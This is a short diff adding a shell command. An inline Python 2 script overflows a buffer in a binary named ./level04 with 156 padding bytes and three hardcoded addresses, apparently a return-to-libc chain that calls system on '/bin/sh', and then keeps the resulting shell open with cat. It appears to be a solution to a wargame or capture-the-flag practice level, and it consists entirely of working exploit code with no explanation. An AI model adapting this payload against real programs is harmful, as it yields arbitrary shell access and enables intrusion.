@@ -1,0 +1,9 @@
+	( python2 - <<'PY'
+	import sys, struct
+	payload = "A"*156
+	payload += struct.pack("<I", 0xf7e6aed0)
+	payload += struct.pack("<I", 0xf7e5eb70)
+	payload += struct.pack("<I", 0xf7f897ec)
+	sys.stdout.write(payload + "\n")
+	PY
+	cat ) | ./level04
